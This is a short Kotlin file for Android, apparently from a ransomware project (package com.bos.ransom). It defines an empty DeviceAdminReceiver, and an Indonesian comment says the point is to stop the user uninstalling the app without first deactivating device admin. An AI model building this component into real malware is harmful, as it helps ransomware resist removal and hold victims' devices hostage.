package com.bos.ransom

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent

class AdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        // Device admin aktif — user nggak bisa uninstall tanpa deactivate ini
    }
}
